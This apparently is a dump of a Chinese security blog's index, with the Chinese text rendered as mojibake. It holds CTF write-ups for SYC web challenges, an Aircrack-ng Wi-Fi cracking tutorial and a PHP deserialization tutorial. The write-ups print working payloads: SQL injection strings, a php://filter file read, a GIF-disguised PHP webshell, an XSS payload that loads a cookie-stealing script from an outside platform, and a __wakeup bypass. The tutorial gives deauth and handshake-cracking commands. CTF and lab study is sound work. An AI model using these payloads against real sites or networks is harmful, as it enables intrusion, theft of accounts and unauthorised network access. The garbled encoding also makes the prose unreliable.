ç¥ç§˜çš„ä¸‰å¶è‰è¿™é“é¢˜å…¶å®å¾ˆç®€å•ï¼Œæ€ªå½“æ—¶æ²¡çœ‹ä»”ç»† æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°Secret.php æ”¹ä¸‹User-Agentï¼ŒRefererï¼ŒX-Forwarded-Forå°±è¡Œï¼Œæ³¨æ„bpæŠ“åŒ…æ”¹çš„æ—¶å€™è¦æœ‰ä¸ªç©ºæ ¼ï¼Œå¹¶ä¸”æ˜¯è‹±æ–‡è¾“å…¥æ³•ä¸‹çš„ç©ºæ ¼ Syc&#123;We1com3_t0_Syc_S3creT&#125; Eval evil codeè¿™é“é¢˜æ„Ÿè§‰å¾ˆå¥½ï¼Œè€ƒå¯Ÿçš„æ˜¯phpæ— å‚æ•°æ‰§è¡Œå‘½ä»¤ å°±æ˜¯ç”¨æ— å‚æ•°çš„phpå‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼Œä¹‹å‰æ²¡äº†è§£è¿‡ï¼Œè¿™æ¬¡å°±å­¦å­¦å§ å¯ä»¥çœ‹ä¸‹æˆ‘è¿™ç¯‡åšå®¢ éªŒè¯ç éƒ¨åˆ†ï¼Œå¯ä»¥ç›´æ¥è„šæœ¬è·‘å‡ºæ¥ 12345678import hashlibfor i in range(1, 10000001): s &#x3D; hashlib.md5(str(i).encode()).hexdigest()[0:4] #s &#x3D; hashlib.sha1(str(i)).hexdigest()[:6] if s &#x3D;&#x3D; &quot;978e&quot;: print(i) break å…ˆä¼ ä¸ªphpinfoçœ‹çœ‹ï¼Œå‘ç° è¿™é‡Œå°±ç”¨Headersçš„æ–¹æ³• eval(end(getallheaders())); è·å–headersçš„æœ€åä¸€ä¸ªæ‰§è¡Œï¼ˆæ³¨æ„åœ¨httpè¯·æ±‚å¤´çš„å‡½æ•°æ˜¯å¯ä»¥æœ‰å‚æ•°çš„ï¼‰ è¯»å–theflag.phpå†…å®¹å³å¯ Jiangâ€˜s SecretæŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸ªArchive_room.phpï¼Œè®¿é—®ç‚¹å‡»secretæç¤ºæŸ¥é˜…ç»“æŸï¼ŒæŠ“åŒ…çœ‹ä¸‹å‘ç°æœ‰ä¸ªäººaction.phpï¼Œå‘é€åˆ°repeater,goä¸€ä¸‹å‘ç°secr3t.php ,è®¿é—®å‘ç°ä»£ç  1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt; payloadï¼š ?file=php://filter/convert.base64-encode/resource=flag.php base64è§£å¯†å‘ç°flag Syc&#123;Jiang_1uYuan_No_I&#125; Hardsqlè¿™é¢˜ç”¨çš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œunion|or|and|substr|if|hex|mid|char|ç­‰ç­‰éƒ½è¿›è¡Œ äº†è¿‡æ»¤ï¼Œè¿™é‡Œåªèƒ½ç”¨æŠ¥é”™æ³¨å…¥çˆ†æ•°æ®åº“ ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)%23 çˆ†è¡¨ ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#39;geek&#39;),0x7e),1)%23 çˆ†å­—æ®µ ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;),0x7e),1)%23 çˆ†å†…å®¹ ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1)%23 åœ¨buuä¸Šflagçš„é•¿åº¦å¤ªé•¿ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨reverseå‡½æ•° ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆç»™äº†ä¸ªbase64åŠ å¯†çš„ä¸œè¥¿ï¼Œè§£å¯†å‘ç°æ˜¯this is not easyï¼Œå¥½åƒæ²¡å•¥ç”¨ æ‰“å¼€ç½‘å€ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¯•ç€ä¸Šä¼ ï¼Œå‘ç°å¯¹æ–‡ä»¶å¤´åšäº†æ£€æµ‹ï¼Œå¹¶ä¸”å¯¹&lt;?è¿‡æ»¤ å‘ç°.phtmlæ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥å°±ä¸Šä¼ ä¸€å¥è¯ GIF89a &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;shell&#39;]);&lt;/script&gt; æŠ“åŒ…å‰ä¸º.gifæ ¼å¼ï¼ŒæŠ“åŒ…åæ”¹æˆ.phtml èšå‰‘è¿ï¼Œå¾—åˆ°flag Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125; Leixiaoâ€™s blogæç¤ºç”¨XSSï¼Œä½†æ˜¯å†™åœ¨åšå®¢é‡Œçš„ä¸œè¥¿åªæœ‰è‡ªå·±è´¦å·å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥å°±å»å…¶ä»–æ‰¾XSS å‘ç°æ³¨å†Œæ—¶çš„å¯†ä¿é—®é¢˜æ˜¯å¯æ§çš„ï¼ŒæŠ“åŒ…ä¿®æ”¹å³å¯ï¼Œå‘ç°æ˜¯é™åˆ¶é•¿åº¦çš„ä¸º32ä½ å¹¶æ²¡æœ‰å¼¹çª— æŸ¥çœ‹æºä»£ç  æ‰€ä»¥é—­åˆæ ‡ç­¾çš„payload &quot;&gt;&lt;script src=***&gt; åœ¨***é‡Œå¡«å…¥ç›—cookieçš„ä»£ç  ç™»é™†xsså¹³å° bpæŠ“åŒ…æ”¹ä¸‹question ç„¶åæŠŠé“¾æ¥å‘ç»™ç®¡ç†å‘˜ åœ¨xsså¹³å°å¯ä»¥çœ‹åˆ°å°±å¯ä»¥å¾—åˆ°flagäº† ååºåˆ—åŒ–1.0è¿™é¢˜å°±æ˜¯è€ƒå¯Ÿå¯¹ååºåˆ—åŒ–çš„åŸºæœ¬è®¤è¯† æŸ¥çœ‹æºä»£ç å‘ç° 123456789101112131415161718&lt;?phpclass Student&#123; public $score &#x3D; 0; public function __destruct() &#123; echo &quot;__destruct working&quot;; if($this-&gt;score&#x3D;&#x3D;10000) &#123; $flag &#x3D; &quot;******************&quot;; echo $flag; &#125; &#125;&#125;$exp &#x3D; $_GET[&#39;exp&#39;];echo &quot;&lt;br&gt;&quot;;unserialize($exp);?&gt; åªéœ€å°†$score=10000å°±è¡Œ, payload: ?exp=O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;i:10000;&#125; Syc&#123;F4n-Xu-L4i-Hu4-Ha-Ha-Ha&#125; åˆæ¥ä¸€åªçŒ«dirsearchæ‰«ä¸€ä¸‹å‘ç°www.zipæ–‡ä»¶ï¼Œå‘ç°å¥½åƒæ˜¯ç½‘ç«™ä¹‹å‰çš„æºç  ä»index.phpå¯ä»¥çœ‹åˆ° 12345 &lt;?phpinclude &#39;class.php&#39;;$select &#x3D; $_GET[&#39;select&#39;];$res&#x3D;unserialize(@$select);?&gt; ä»class.phpå¯ä»¥çœ‹åˆ° 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; è¿™é¢˜å°±å˜æˆäº†ç»•è¿‡__wakeupæ–¹æ³• payloadï¼š ?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; Syc&#123;H31lo_4dmiN_r3al_f14g&#125; ä½ æœ‰åˆæ‹å—æŸ¥çœ‹æºä»£ç  123456789101112&lt;!--$adore&#x3D;&#39;***************&#39;;$now &#x3D; $_POST[&#39;lover&#39;];setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));if(isset($now)&amp;&amp;$now!&#x3D;syclover) &#123; if($_COOKIE[&#39;Heart&#39;] &#x3D;&#x3D;&#x3D; md5($adore. urldecode($now)))&#123; die ($flag); &#125;else &#123; die(&#39;I do not love you! You are not in my heart!&#39;); &#125; &#125;--&gt; è¿™é‡Œç”¨urläºŒæ¬¡ç¼–ç å°±è¡Œ ç›´æ¥ç”¨hackbar POST lover=%2573%2579%2563%256c%256f%2576%2565%2572 Syc&#123;D0_Y0u_l0v3_M3???&#125; ï¬nalsqlè¿™é“é¢˜ç™»é™†æ¡†çš„æ³¨å…¥å·²ç»è¢«è¿‡æ»¤çš„å¹²å¹²å‡€å‡€ï¼Œä¸è¿‡åœ¨ç¥ç§˜ä»£ç å¤„å¯ä»¥è¿›è¡Œå¼‚æˆ–ç›²æ³¨ ç©ºæ ¼ï¼Œ*ä»¥åŠæ‰€æœ‰mysqlé‡Œå¯ä»¥ä»£æ›¿ç©ºæ ¼çš„ä¸å¯æ˜¾å­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨æ‹¬å· ç¦ç”¨äº†oræˆ–andä¸=è¿ç”¨ï¼Œæ‰€ä»¥or 1=(payload)å½¢å¼ä¸å¥½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨å¼‚æˆ–æ³¨å…¥ï¼ˆå½“ç„¶å…¶å®ƒè¿ç®—ç¬¦éƒ½å¯ä»¥ï¼‰ï¼Œè„šæœ¬å¦‚ä¸‹ äºŒåˆ†æ³•è„šæœ¬ï¼š","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://www.m00nback.xyz/tags/wp/"},{"name":"SYC","slug":"SYC","permalink":"http://www.m00nback.xyz/tags/SYC/"}]},{"title":"Aircrack-ngå­¦ä¹ ä½¿ç”¨","slug":"aircrack-wifi","date":"2019-11-02T06:53:40.000Z","updated":"2020-04-28T07:32:23.050Z","comments":true,"path":"2019/11/02/aircrack-wifi/","link":"","permalink":"http://www.m00nback.xyz/2019/11/02/aircrack-wifi/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Aircrack-ngçš„ä½¿ç”¨ï¼Œä»¥åŠç”¨æ­¤å·¥å…·ç ´è§£wifiçš„æ•™ç¨‹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Aircrack-ngçš„ä½¿ç”¨ï¼Œä»¥åŠç”¨æ­¤å·¥å…·ç ´è§£wifiçš„æ•™ç¨‹ï¼ Aircrack-ngæ˜¯ä»€ä¹ˆï¼ŸAircrack-ngæ˜¯ä¸€ä¸ªä¸802.11æ ‡å‡†çš„æ— çº¿ç½‘ç»œåˆ†ææœ‰å…³çš„å®‰å…¨å¥—ä»¶ã€‚ ä¸»è¦åŠŸèƒ½ï¼šç½‘ç»œä¾¦æµ‹ï¼Œæ•°æ®åŒ…å—…æ¢ï¼ŒWEPå’ŒWPA/WPA2-PSKç ´è§£ã€‚ Aircrack-ngå¯ä»¥å·¥ä½œåœ¨ä»»ä½•æ”¯æŒç›‘å¬æ¨¡å¼çš„æ— çº¿ç½‘å¡ä¸Šï¼ˆè®¾å¤‡åˆ—è¡¨è¯·å‚é˜…å…¶å®˜æ–¹ç½‘ç«™ï¼‰å¹¶å—…æ¢802.11aï¼Œ802.11bï¼Œ802.11gçš„æ•°æ® aircrack-ng å¥—ä»¶åŒ…å«æœ‰ï¼š å®æˆ˜ç ´è§£wifiåˆ†ä¸ºäº”ä¸ªé˜¶æ®µï¼š å‡†å¤‡ æ¢æµ‹ æŠ“åŒ… æ”»å‡» ç ´è§£ å‡†å¤‡ç¡¬ä»¶æ–¹é¢ï¼š æ— çº¿ç½‘å¡ kaliè™šæ‹Ÿæœºï¼ˆæˆ–è€…è£…æœ‰Aircrack-ngå¥—ä»¶çš„windows) å‡†å¤‡ä¸€ä¸ªå¼ºå¤§çš„å­—å…¸ æ¢æµ‹å¼€å§‹æ—¶ä¸€å®šè¦ä¿è¯å®ƒç°åœ¨æ²¡æœ‰è¿æ¥åˆ°ä»»ä½•wifi ä¸‹é¢é‚£ä¸ªwlan0é‡Œé¢æ²¡æœ‰ipåœ°å€ä»€ä¹ˆçš„å°±è¯´æ˜ç°åœ¨ä¸åœ¨è¿æ¥ä¸­ å¯ç”¨æ— çº¿ç½‘å¡è‡³monitorå³ç›‘å¬æ¨¡å¼ airmon-ng start wlan0 å¦‚æœå†æ¬¡ä½¿ç”¨ifconfigå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬çš„ç½‘å¡å·²ç»è¢«é‡å‘½åä¸ºwlan0mon è·å–å½“å‰ç½‘ç»œæ¦‚å†µï¼š airodump-ng wlan0mon æŠ“åŒ… æ¢æµ‹æ— çº¿ç½‘ç»œï¼ŒæŠ“å–æ— çº¿æ•°æ®åŒ… airodump-ng --bssid ç›®æ ‡macåœ°å€ -c 11 -w longas wlan0mon å‚æ•°è§£é‡Šï¼š â€“bssid -cè®¾ç½®ç›®æ ‡APçš„å·¥ä½œé¢‘é“ -wåé¢ç´§è·Ÿè¦ä¿å­˜çš„æ–‡ä»¶çš„æ–‡ä»¶åï¼Œæ³¨æ„ï¼šç”Ÿæˆçš„æ–‡ä»¶åæ˜¯longas-01.cap wlan0monï¼šä¸ºä¹‹å‰å·²ç»å¼€å¯ç›‘å¬çš„ç½‘å¡å æŒ‰Enterå¼€å§‹æ‰§è¡Œï¼Œä¸è¦å…³é—­å¹¶æ‰“å¼€å¦ä¸€ä¸ªshellè¿›è¡Œä¸‹ä¸€æ­¥ æ”»å‡»è¿™é‡Œä¸ºäº†è·å¾—ç ´è§£æ‰€éœ€çš„WPA2æ¡æ‰‹éªŒè¯çš„æ•´ä¸ªå®Œæ•´æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°†ä¼šå‘é€ä¸€ç§ç§°ä¹‹ä¸ºâ€œDeauthâ€çš„æ•°æ®åŒ…æ¥å°†å·²ç»è¿æ¥è‡³æ— çº¿è·¯ç”±å™¨çš„åˆæ³•æ— çº¿å®¢æˆ·ç«¯å¼ºåˆ¶æ–­å¼€ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šè‡ªåŠ¨é‡æ–°è¿æ¥æ— çº¿è·¯ç”±å™¨ï¼Œæˆ‘ä»¬ä¹Ÿå°±æœ‰æœºä¼šæ•è·åˆ°åŒ…å«WPA2æ¡æ‰‹éªŒè¯çš„å®Œæ•´æ•°æ®åŒ…äº†ã€‚æ­¤å¤„éœ€è¦æ–°å¼€ä¸€ä¸ªshellï¼š aireplay-ng -0 1 â€“a è·¯ç”±å™¨mac -c å®¢æˆ·ç«¯mac wlan0mon å‚æ•°è§£é‡Šï¼š -0 é‡‡ç”¨deauthæ”»å‡»æ¨¡å¼ï¼Œåé¢è·Ÿä¸Šæ”»å‡»æ¬¡æ•°ï¼Œè¿™é‡Œæˆ‘è®¾ç½®ä¸º1ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè®¾ç½®ä¸º10ä¸ç­‰ -a åè·Ÿè·¯ç”±å™¨çš„macåœ°å€ -c åè·Ÿå®¢æˆ·ç«¯çš„macåœ°å€ï¼Œä¸æŒ‡å®šçš„è¯ä¼šæ”»å‡»æ‰€æœ‰çš„å·²è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œä¸‹å›¾ä¸­STATIONä¸€æ ä»£è¡¨çš„å°±æ˜¯å·²è¿æ¥çš„å®¢æˆ·ç«¯ ç„¶åå›åˆ°æŠ“å–æ•°æ®åŒ…çš„ç•Œé¢ã€‚åœ¨å³ä¸Šè§’å‡ºç°handshakeçš„æç¤ºè¯æ˜è·å¾—äº†åŒ…å«WPA-PSKå¯†ç çš„æ¡æ‰‹æ•°æ®æŠ¥æ–‡ã€‚å¦‚æœªå‡ºç°ï¼Œè¯·å†æ¬¡æ‰§è¡Œä¸Šè¿°æ­¥éª¤ ç ´è§£aircrack-ng -w dict.txt æ•è·çš„.capæ–‡ä»¶ ç”±äºæˆ‘è¿™ä¸ªå¯†ç è®¾ç½®çš„ç®€å•ï¼Œå›è½¦ç«‹é©¬å‡ºæ¥äº† å‚è€ƒï¼š https://www.jianshu.com/p/fd16236057dfhttps://chujian521.github.io/blog/2018/08/23/ä½¿ç”¨Aircrack-ngè¿›è¡ŒWiFiå¯†ç ç ´è§£/","categories":[],"tags":[{"name":"Aircrack-ng","slug":"Aircrack-ng","permalink":"http://www.m00nback.xyz/tags/Aircrack-ng/"},{"name":"wifiç ´è§£","slug":"wifiç ´è§£","permalink":"http://www.m00nback.xyz/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"kali","slug":"kali","permalink":"http://www.m00nback.xyz/tags/kali/"}]},{"title":"phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–","slug":"php-serialize","date":"2019-10-27T11:57:01.000Z","updated":"2020-02-01T07:14:54.631Z","comments":true,"path":"2019/10/27/php-serialize/","link":"","permalink":"http://www.m00nback.xyz/2019/10/27/php-serialize/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†ï¼ ç›¸å…³æ¦‚å¿µä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ **åºåˆ—åŒ–:**æŠŠå¤æ‚çš„æ•°æ®ç±»å‹å‹ç¼©åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ•°æ®ç±»å‹å¯ä»¥æ˜¯æ•°ç»„ï¼Œå­—ç¬¦ä¸²ï¼Œå¯¹è±¡ç­‰ **ååºåˆ—åŒ–:**æ¢å¤åŸå…ˆè¢«åºåˆ—åŒ–çš„å˜é‡ ç›¸å…³å‡½æ•°serialize() //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸² unserialize() //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–ä¾‹å¦‚ä¸‹é¢ä¸€æ®µä»£ç  123456789101112&lt;?php class test &#123; private $flag &#x3D; &quot;flag&#123;233&#125;&quot;; public $a &#x3D; &quot;aaa&quot;; static $b &#x3D; &quot;bbb&quot;; &#125; $test &#x3D; new test; $data &#x3D; serialize($test); echo $data; ?&gt; çœ‹ä¸€ä¸‹è¿è¡Œç»“æœ O:4:&quot;test&quot;:2:&#123;s:10:&quot; test flag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125; åºåˆ—åŒ–çš„ç»“æœæ»¡è¶³ï¼š O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125; è¿™é‡Œè¯´æ˜ä¸€ä¸‹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å«ä¹‰ï¼š O:4:&quot;test&quot;æŒ‡Object(å¯¹è±¡) 4ä¸ªå­—ç¬¦:test :2å¯¹è±¡å±æ€§ä¸ªæ•°ä¸º2 &#123;&#125;ä¸­ä¸ºå±æ€§å­—ç¬¦æ•°ï¼šå±æ€§å€¼ æ³¨æ„ï¼šå¯ä»¥çœ‹åˆ°testflagçš„é•¿åº¦ä¸º8ï¼Œåºåˆ—åŒ–ä¸­å´æ˜¾ç¤ºé•¿åº¦ä¸º10ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ˜¯privateå±æ€§ï¼Œç¿»é˜…æ–‡æ¡£å°±å¯ä»¥çœ‹åˆ°è¯´æ˜ï¼Œå®ƒä¼šåœ¨ä¸¤ä¾§åŠ å…¥ç©ºå­—èŠ‚ \\x00 + ç±»å + \\x00 + å˜é‡å ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯privateå˜é‡, \\x00 + * + \\x00 + å˜é‡å ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯protectedå˜é‡ ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯publicå˜é‡ ååºåˆ—åŒ–ä¸‹é¢ä¸€æ®µä»£ç  1234567&lt;?php $str &#x3D; &#39;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#39;; $data &#x3D; urldecode($str); $obj &#x3D; unserialize($data); var_dump($obj); ?&gt; é­”æœ¯æ–¹æ³•PHPä¸­æŠŠä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿__å¼€å¤´çš„æ–¹æ³•ç§°ä¸ºé­”æœ¯æ–¹æ³•(Magic methods) æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªå‡½æ•°ï¼š __sleep() serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚ __wakeup() unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ __toString() __toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚ __destruct() ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ __construct() é€ æ–¹æ³•æ˜¯å¯¹è±¡åˆ›å»ºå®Œæˆåç¬¬ä¸€ä¸ªè¢«å¯¹è±¡è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ã€‚åœ¨æ¯ä¸ªç±»ä¸­éƒ½æœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºå£°æ˜å®ƒï¼Œé‚£ä¹ˆç±»ä¸­éƒ½ä¼šé»˜è®¤å­˜åœ¨ä¸€ä¸ªæ²¡æœ‰å‚æ•°ä¸”å†…å®¹ä¸ºç©ºçš„æ„é€ æ–¹æ³•ã€‚é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚ é­”æœ¯æ–¹æ³•æ‰§è¡Œæµç¨‹ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920212223242526272829&lt;?phpclass Test&#123; public function __construct()&#123; echo &#x27;construct run&#x27;; &#125; public function __destruct()&#123; echo &#x27;destruct run&#x27;; &#125; public function __toString()&#123; echo &#x27;toString run&#x27;; &#125; public function __sleep()&#123; echo &#x27;sleep run&#x27;; &#125; public function __wakeup()&#123; echo &#x27;wakeup run&#x27;; &#125;&#125;$test= new Test();$sTest= serialize($test);$usTest= unserialize($sTest);$string= &#x27;hello class &#x27; . $test;?&gt; åˆ†æä¸€ä¸‹æ‰§è¡Œè¿‡ç¨‹ï¼š newäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡è¢«åˆ›å»ºï¼Œæ‰§è¡Œ__constructæ–¹æ³• serializeäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œå…ˆæ‰§è¡Œ__sleepæ–¹æ³•ï¼Œå†åºåˆ—åŒ– unserializeäº†ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œå…ˆååºåˆ—åŒ–ï¼Œå†æ‰§è¡Œ__wakeupæ–¹æ³• æŠŠTestè¿™ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²ä½¿ç”¨äº†ï¼Œæ‰§è¡Œ__toStringæ–¹æ³• ç¨‹åºè¿è¡Œå®Œæ¯•ï¼Œå¯¹è±¡è‡ªåŠ¨é”€æ¯ï¼Œæ‰§è¡Œ__destructæ–¹æ³• æ¼æ´åˆ©ç”¨CVE-2016-7124è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ç”¨äºç»•è¿‡__wakeup()æ–¹æ³•çš„ åˆ©ç”¨æ–¹å¼ï¼š å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ ä¾‹å¦‚ï¼š æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼š O:5:&quot;SoFun&quot;:1:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; ç»•è¿‡__wakeupï¼š O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; è¿™ä¸ª\\00åœ¨urlä¼ è¾“æ—¶ä½¿ç”¨%00çš„ sessionååºåˆ—åŒ–æ¼æ´ç®€ä»‹PHPåœ¨sessionå­˜å‚¨å’Œè¯»å–æ—¶,éƒ½ä¼šæœ‰ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ŒPHPå†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å– $_SESSION æ•°æ®ï¼Œéƒ½ä¼šå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ– åœ¨php.iniä¸­æœ‰ä»¥ä¸‹å…³äºsessioné…ç½®é¡¹(é€šè¿‡phpinfo)ï¼š æœ‰å‡ ä¸ªé‡è¦çš„é…ç½®ï¼š session.save_path è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„ session.save_handler è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•° session.auto_start æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ session.serialize_handler å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨phpé™¤äº†é»˜è®¤çš„sessionåºåˆ—åŒ–å¼•æ“phpå¤–ï¼Œè¿˜æœ‰å‡ 